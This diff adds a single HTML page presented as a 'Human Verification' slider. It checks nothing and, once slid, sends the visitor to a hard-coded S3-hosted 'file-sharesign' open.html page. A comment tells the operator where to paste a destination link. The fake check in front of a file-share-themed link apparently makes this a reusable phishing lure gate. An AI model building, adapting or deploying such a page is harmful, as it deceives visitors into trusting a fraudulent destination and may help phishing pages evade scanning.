@@ -1,0 +1,228 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Human Verification</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #f8fafc;
+            color: #1e293b;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            padding: 1rem;
+        }
+        .verify-card {
+            background: #ffffff;
+            width: 100%;
+            max-width: 420px;
+            padding: 2.5rem 2rem;
+            border-radius: 16px;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.06), 0 2px 8px rgba(0, 0, 0, 0.04);
+            text-align: center;
+        }
+        .shield-icon {
+            width: 64px;
+            height: 64px;
+            background: #e0f2fe;
+            color: #0284c7;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 1.5rem;
+        }
+        .shield-icon svg { width: 32px; height: 32px; }
+        .verify-title { font-size: 1.5rem; font-weight: 700; margin-bottom: 0.5rem; }
+        .verify-subtitle { font-size: 0.95rem; color: #64748b; margin-bottom: 2rem; line-height: 1.5; }
+
+        /* Slider Styles */
+        .slider-container {
+            position: relative;
+            width: 100%;
+            height: 56px;
+            background: #f1f5f9;
+            border-radius: 28px;
+            border: 1px solid #e2e8f0;
+            user-select: none;
+            -webkit-user-select: none;
+            overflow: hidden;
+        }
+        .slider-track {
+            position: absolute;
+            top: 0;
+            left: 0;
+            height: 100%;
+            width: 0%;
+            background: #10b981;
+            border-radius: 28px;
+            transition: width 0.1s linear;
+        }
+        .slider-text {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            font-size: 0.9rem;
+            font-weight: 600;
+            color: #94a3b8;
+            pointer-events: none;
+            white-space: nowrap;
+            transition: opacity 0.2s ease;
+        }
+        .slider-thumb {
+            position: absolute;
+            top: 4px;
+            left: 4px;
+            width: 48px;
+            height: 48px;
+            background: #ffffff;
+            border-radius: 50%;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.15);
+            cursor: grab;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #64748b;
+            transition: transform 0.1s linear, background-color 0.2s ease, color 0.2s ease;
+            z-index: 2;
+        }
+        .slider-thumb:active { cursor: grabbing; }
+        .slider-thumb svg { width: 20px; height: 20px; pointer-events: none; }
+        
+        /* Success State */
+        .slider-container.success .slider-track { background: #10b981; }
+        .slider-container.success .slider-thumb { 
+            background: #10b981; 
+            color: #ffffff; 
+            cursor: default;
+        }
+        .slider-container.success .slider-text { opacity: 0; }
+        .slider-container.success .slider-text-success { opacity: 1; }
+
+        .slider-text-success {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            font-size: 0.95rem;
+            font-weight: 700;
+            color: #ffffff;
+            pointer-events: none;
+            white-space: nowrap;
+            opacity: 0;
+            transition: opacity 0.3s ease;
+            z-index: 3;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="verify-card">
+        <div class="shield-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
+                <path stroke-linecap="round" stroke-linejoin="round" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
+            </svg>
+        </div>
+        <h1 class="verify-title">Human Verification</h1>
+        <p class="verify-subtitle">Please slide to verify you are human and continue to the next page.</p>
+
+        <div class="slider-container" id="sliderContainer">
+            <div class="slider-track" id="sliderTrack"></div>
+            <div class="slider-text">Slide to Verify &rarr;</div>
+            <div class="slider-text-success">Verified ✓</div>
+            <div class="slider-thumb" id="sliderThumb">
+                <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2.5">
+                    <path stroke-linecap="round" stroke-linejoin="round" d="M9 5l7 7-7 7" />
+                </svg>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // ==========================================
+        // CONFIGURATION
+        // ==========================================
+        // Paste the link you want to redirect to AFTER successful verification
+        const TARGET_URL = "https://file-sharesign11.s3.us-east-2.amazonaws.com/open.html"; 
+        // ==========================================
+
+        const container = document.getElementById('sliderContainer');
+        const thumb = document.getElementById('sliderThumb');
+        const track = document.getElementById('sliderTrack');
+        
+        let isDragging = false;
+        let startX = 0;
+        let currentX = 0;
+        let isVerified = false;
+
+        const maxDrag = container.offsetWidth - thumb.offsetWidth - 8; // 8px for padding (4px each side)
+
+        function startDrag(e) {
+            if (isVerified) return;
+            isDragging = true;
+            startX = (e.touches ? e.touches[0].clientX : e.clientX) - currentX;
+            thumb.style.transition = 'none';
+            track.style.transition = 'none';
+        }
+
+        function onDrag(e) {
+            if (!isDragging || isVerified) return;
+            e.preventDefault(); // Prevent scrolling on mobile while sliding
+            
+            const clientX = e.touches ? e.touches[0].clientX : e.clientX;
+            currentX = clientX - startX;
+
+            // Clamp values
+            if (currentX < 0) currentX = 0;
+            if (currentX > maxDrag) currentX = maxDrag;
+
+            thumb.style.transform = `translateX(${currentX}px)`;
+            track.style.width = `${currentX + 24}px`; // +24 to fill behind the thumb center
+        }
+
+        function endDrag() {
+            if (!isDragging || isVerified) return;
+            isDragging = false;
+
+            if (currentX >= maxDrag - 5) { // Allow a tiny margin of error
+                verifySuccess();
+            } else {
+                // Reset
+                currentX = 0;
+                thumb.style.transition = 'transform 0.3s ease';
+                track.style.transition = 'width 0.3s ease';
+                thumb.style.transform = `translateX(0px)`;
+                track.style.width = `0px`;
+            }
+        }
+
+        function verifySuccess() {
+            isVerified = true;
+            currentX = maxDrag;
+            thumb.style.transform = `translateX(${maxDrag}px)`;
+            track.style.width = `100%`;
+            container.classList.add('success');
+
+            // Redirect after a brief delay to show the "Verified" state
+            setTimeout(() => {
+                window.location.href = TARGET_URL;
+            }, 600);
+        }
+
+        // Mouse Events
+        thumb.addEventListener('mousedown', startDrag);
+        window.addEventListener('mousemove', onDrag);
+        window.addEventListener('mouseup', endDrag);
+
+        // Touch Events (Mobile)
+        thumb.addEventListener('touchstart', startDrag, { passive: false });
+        window.addEventListener('touchmove', onDrag, { passive: false });
+        window.addEventListener('touchend', endDrag);
+    </script>
+</body>
+</html>
